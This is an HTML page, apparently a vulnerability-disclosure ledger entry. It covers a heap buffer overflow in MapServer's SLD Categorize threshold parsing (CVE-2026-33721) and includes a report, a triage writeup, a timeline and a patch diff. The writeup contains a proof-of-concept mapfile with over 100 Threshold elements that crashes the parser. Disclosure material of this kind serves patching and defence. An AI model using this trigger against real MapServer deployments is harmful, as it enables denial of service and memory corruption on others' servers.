@@ -1,0 +1,207 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ANT-2026-9SZMPW41 · mapserver</title>
+<link rel="icon" type="image/x-icon" href="/anthropic-serve/favicon.ico">
+<script>(function(){try{var t=localStorage.getItem("cvd_theme");if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);}catch(e){}})();</script>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/ledger.css">
+</head>
+<body>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MT0111843S"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-MT0111843S');
+</script>
+<main>
+<h1>ANT-2026-9SZMPW41 · mapserver</h1>
+<nav class="site-nav muted">
+<a href="../index.html">Overview</a>  ·
+<a href="../ledger/index.html">Ledger</a>  ·
+<a href="../archive/index.html">Archive</a>  ·
+<a href="../about/index.html">About</a>  <span class="theme-toggle">
+    <button type="button" data-set-theme="light">Light</button>
+    <button type="button" data-set-theme="dark">Dark</button>
+    <button type="button" data-set-theme="system">System</button>
+  </span>
+</nav>
+<h2>
+  oob-write
+  <span class="sev-badge sev-medium">medium</span>
+</h2>
+
+<p class="id-badges">
+  <a class="id-badge" href="https://nvd.nist.gov/vuln/detail/CVE-2026-33721">CVE-2026-33721</a>
+</p>
+
+<p class="sev-compare">
+  <span class="sev-compare-label">Severity</span>
+  <span class="sev-compare-item">Claude <span class="sev-chip sev-medium">medium</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Security research firm <span class="sev-chip sev-medium">medium</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Maintainer <span class="sev-chip sev-unknown">-</span></span>
+</p>
+
+<p class="attribution">Discovered by
+<span class="model-chip">Claude Mythos Preview</span></p>
+
+
+<div class="marker">REPORT</div>
+<p class="section-intro">Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Trail of Bits.</p>
+<div class="report-body" tabindex="0"><h1>ANT-2026-9SZMPW41: Heap buffer overflow in SLD categorize threshold parsing due to wrong counter variable in reallocation guard</h1>
+<p>While parsing Threshold entries in an SLD Categorize expression, the code grows a heap array to hold parsed thresholds, but the bounds check guarding the realloc uses the wrong counter variable. As a result the buffer is not enlarged when it should be, and subsequent threshold entries are written past the end of the allocation. An attacker who can supply an SLD document with many Threshold elements can trigger an out-of-bounds heap write.</p>
+<h2>Target</h2>
+<p><strong>Project:</strong> mapserver<br>
+<strong>Discovery:</strong> static analysis — not yet dynamically reproduced  </p>
+<h2>Technical Details</h2>
+<p>The reallocation guard compares against a different counter than the one actually used to index/increment into the thresholds array, so the realloc branch is never (or not correctly) taken as thresholds accumulate. Writes then proceed past the allocated heap block. No ASAN output was provided in the report.</p>
+<h2>Reproduction</h2>
+<p>This finding was identified by static analysis and has not yet been dynamically reproduced. The Technical Details section above describes the code path; a trigger input is not included.</p>
+<p><em>[No reproducer or sanitizer output attached — request from security-cvd@anthropic.com if needed.]</em></p>
+<h2>Acknowledgement</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-9SZMPW41.</p>
+<hr>
+<p><strong>Reference:</strong> ANT-2026-9SZMPW41<br>
+<strong>Anthropic CVD Policy:</strong> https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+<div class="marker">SECURITY RESEARCH FIRM ANALYSIS</div>
+<p class="section-intro">Triage and disclosure were performed by Trail of Bits. The writeup below is the document the firm sent to the maintainer.</p>
+<dl class="vendor-analysis">
+<dt>Verdict</dt><dd><span class="verdict-chip verdict-tp">true positive</span></dd><dt>Severity</dt><dd class="sev-medium">medium</dd></dl>
+<div class="report-body" tabindex="0"><h3>Summary</h3>
+<p>A heap-buffer-overflow write in MapServer’s SLD (Styled Layer Descriptor) parser lets a remote, unauthenticated attacker crash the MapServer process by sending a crafted SLD with more than 100 Threshold elements inside a ColorMap/
+  Categorize structure (commonly reachable via WMS GetMap with SLD_BODY).</p>
+<h3>Details</h3>
+<p>MapServer’s SLD parser in msSLDParseRasterSymbolizer (src/mapogcsld.cpp, around the Categorize parsing logic) allocates papszThresholds for 100 entries (nMaxThreshold = 100) and appends one char* per  element while incrementing nThresholds, but the growth check mistakenly tests nValues == nMaxThreshold (where nValues counts  nodes) instead of nThresholds == nMaxThreshold; when an SLD ColorMap/Categorize contains more than 100  elements, the code keeps writing past the end of the heap-allocated pointer array (an out-of-bounds 8-byte pointer write per extra element), leading to an ASAN heap-buffer-overflow and typically a remote crash/denial-of-service when attacker-controlled SLD is parsed (for example via WMS GetMap with SLD_BODY, depending on deployment configuration).</p>
+<h3>PoC</h3>
+<pre tabindex="0"><code>MAP
+NAME &quot;x&quot;
+CONFIG &quot;MS_ERRORFILE&quot; &quot;/tmp/evilsld.xml&quot;
+OUTPUTFORMAT
+NAME &quot;&lt;StyledLayerDescriptor&gt;&lt;NamedLayer&gt;&lt;Name&gt;x&lt;/Name&gt;&lt;UserStyle&gt;&lt;FeatureTypeStyle&gt;&lt;Rule&gt;&lt;RasterSymbolizer&gt;&lt;ColorMap&gt;&lt;Categorize&gt;&lt;Value&gt;aaaaaaaaaaaa&lt;/Value&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;&quot;
+DRIVER &quot;AGG/PNG&quot;
+IMAGEMODE RGB
+TRANSPARENT ON
+END
+OUTPUTFORMAT
+NAME &quot;&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;Threshold&gt;1&lt;/Threshold&gt;&lt;/Categorize&gt;&lt;/ColorMap&gt;&lt;/RasterSymbolizer&gt;&lt;/Rule&gt;&lt;/FeatureTypeStyle&gt;&lt;/UserStyle&gt;&lt;/NamedLayer&gt;&lt;/StyledLayerDescriptor&gt;&quot;
+DRIVER &quot;AGG/PNG&quot;
+IMAGEMODE RGB
+TRANSPARENT ON
+END
+CONFIG &quot;MS_ERRORFILE&quot; &quot;stderr&quot;
+LAYER
+NAME &quot;test&quot;
+TYPE POINT
+STYLEITEM &quot;sld:///tmp/evilsld.xml&quot;
+END
+END
+</code></pre>
+<p>Reproduce with</p>
+<pre tabindex="0"><code>  export OSS_FUZZ_DIR=&quot;$HOME/src/oss-fuzz&quot;
+  git clone https://github.com/google/oss-fuzz.git &quot;$OSS_FUZZ_DIR&quot;
+  cd &quot;$OSS_FUZZ_DIR&quot;
+  python3 infra/helper.py build_fuzzers --sanitizer address mapserver
+  python3 infra/helper.py reproduce mapserver mapfuzzer poc.bin
+</code></pre>
+<h3>Fix (idea)</h3>
+<pre tabindex="0"><code class="language-diff">  --- a/src/mapogcsld.cpp
+  +++ b/src/mapogcsld.cpp
+  @@ -2894,7 +2894,7 @@
+           } else if (strcasecmp(psNode-&gt;pszValue, &quot;Threshold&quot;) == 0) {
+             papszThresholds[nThresholds] = psNode-&gt;psChild-&gt;pszValue;
+             nThresholds++;
+  -          if (nValues == nMaxThreshold) {
+  +          if (nThresholds == nMaxThreshold) {
+               nMaxThreshold += 100;
+               papszThresholds = (char **)msSmallRealloc(
+                   papszThresholds, sizeof(char *) * nMaxThreshold);
+</code></pre>
+<h3>Impact</h3>
+<p>Memory corruption (heap out-of-bounds write in a pointer array). Deployments that parse attacker-controlled SLD (commonly WMS users if SLD_BODY is accepted/enabled).</p>
+<h3>Background</h3>
+<p>Anthropic is conducting research into the use of large language models for automated vulnerability discovery in open source software. As part of that work, Anthropic used Claude to scan a set of widely used open source projects for security issues. Anthropic then engaged Trail of Bits to independently triage, manually validate, and develop patches for the findings. This issue has been reviewed and confirmed by human security researchers at Trail of Bits.</p></div>
+
+
+
+
+
+<div class="marker">TIMELINE</div>
+<p class="section-intro">Recorded dates, in order.</p>
+<div class="figure">
+  <ol class="timeline">
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-03-29</span>
+      <span class="timeline-label">Discovered or logged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-07</span>
+      <span class="timeline-label">Sent to maintainer</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-07</span>
+      <span class="timeline-label">Maintainer acknowledged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-07</span>
+      <span class="timeline-label">Patch released</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-20</span>
+      <span class="timeline-label">Publicly revealed</span>
+    </li>
+  </ol>
+</div>
+
+<div class="marker">PROVENANCE</div>
+<p class="kicker">SHA-3-512 hash:</p>
+<p class="hash full">5623c6557ab0c7f772e18cc200aa77f720d757b39fdf25608bd142d507d38e19a70d8b584699cf63f0c46952a935a92275ba856109d79d2505f0cbc059aab77f</p>
+<p class="kicker">Committed 2026-05-07 07:01 UTC</p>
+<p class="kicker">Revealed 2026-05-20 07:40 UTC</p>
+<p class="kicker">
+  <a download="ANT-2026-9SZMPW41-preimage.json"
+     href="data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-9SZMPW41%22%2C%22bug_class%22%3A%22Heap%20Buffer%20Overflow%22%2C%22claude_severity%22%3A%22medium%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-03-29T20%3A43%3A18%2B00%3A00%22%2C%22description%22%3A%22While%20parsing%20Threshold%20entries%20in%20an%20SLD%20Categorize%20expression%2C%20the%20code%20grows%20a%20heap%20array%20to%20hold%20parsed%20thresholds%2C%20but%20the%20bounds%20check%20guarding%20the%20realloc%20uses%20the%20wrong%20counter%20variable.%20As%20a%20result%20the%20buffer%20is%20not%20enlarged%20when%20it%20should%20be%2C%20and%20subsequent%20threshold%20entries%20are%20written%20past%20the%20end%20of%20the%20allocation.%20An%20attacker%20who%20can%20supply%20an%20SLD%20document%20with%20many%20Threshold%20elements%20can%20trigger%20an%20out-of-bounds%20heap%20write.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3Anull%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22MapServer%22%2C%22reproduction%22%3Anull%2C%22technical_details%22%3A%22The%20reallocation%20guard%20compares%20against%20a%20different%20counter%20than%20the%20one%20actually%20used%20to%20index/increment%20into%20the%20thresholds%20array%2C%20so%20the%20realloc%20branch%20is%20never%20%28or%20not%20correctly%29%20taken%20as%20thresholds%20accumulate.%20Writes%20then%20proceed%20past%20the%20allocated%20heap%20block.%20No%20ASAN%20output%20was%20provided%20in%20the%20report.%22%2C%22title%22%3A%22Heap%20buffer%20overflow%20in%20SLD%20categorize%20threshold%20parsing%20due%20to%20wrong%20counter%20variable%20in%20reallocation%20guard%22%2C%22vendor_severity%22%3A%22medium%22%7D">Verify (download preimage.json)</a>
+</p>
+<details class="preimage">
+  <summary>Show preimage JSON</summary>
+  <pre class="preimage-body">{
+  &#34;ant_id&#34;: &#34;ANT-2026-9SZMPW41&#34;,
+  &#34;bug_class&#34;: &#34;Heap Buffer Overflow&#34;,
+  &#34;claude_severity&#34;: &#34;medium&#34;,
+  &#34;commit_sha&#34;: null,
+  &#34;created_at&#34;: &#34;2026-03-29T20:43:18+00:00&#34;,
+  &#34;description&#34;: &#34;While parsing Threshold entries in an SLD Categorize expression, the code grows a heap array to hold parsed thresholds, but the bounds check guarding the realloc uses the wrong counter variable. As a result the buffer is not enlarged when it should be, and subsequent threshold entries are written past the end of the allocation. An attacker who can supply an SLD document with many Threshold elements can trigger an out-of-bounds heap write.&#34;,
+  &#34;discovered_at&#34;: null,
+  &#34;location&#34;: null,
+  &#34;poc_sha256&#34;: null,
+  &#34;preimage_version&#34;: 1,
+  &#34;project&#34;: &#34;MapServer&#34;,
+  &#34;reproduction&#34;: null,
+  &#34;technical_details&#34;: &#34;The reallocation guard compares against a different counter than the one actually used to index/increment into the thresholds array, so the realloc branch is never (or not correctly) taken as thresholds accumulate. Writes then proceed past the allocated heap block. No ASAN output was provided in the report.&#34;,
+  &#34;title&#34;: &#34;Heap buffer overflow in SLD categorize threshold parsing due to wrong counter variable in reallocation guard&#34;,
+  &#34;vendor_severity&#34;: &#34;medium&#34;
+}</pre>
+</details>
+</main>
+<footer>
+  <p>Anthropic Frontier Red Team</p>
+  <p>Snapshot generated at 2026-11-02 19:30 UTC</p>
+  <p>Dates and times are in UTC</p>
+  <p>Manifest hash <code>25d811e7b56632ef5bbb23eb…</code></p>
+  <p>Archived snapshots remain available at their dated paths so any figure can be verified against the page that was live on that date</p>
+  <p><a href="../data/payload.json">payload.json</a></p>
+</footer>
+<script src="../assets/figures.js" data-root="../"></script>
+<script src="../assets/ledger.js"></script>
+</body>
+</html>
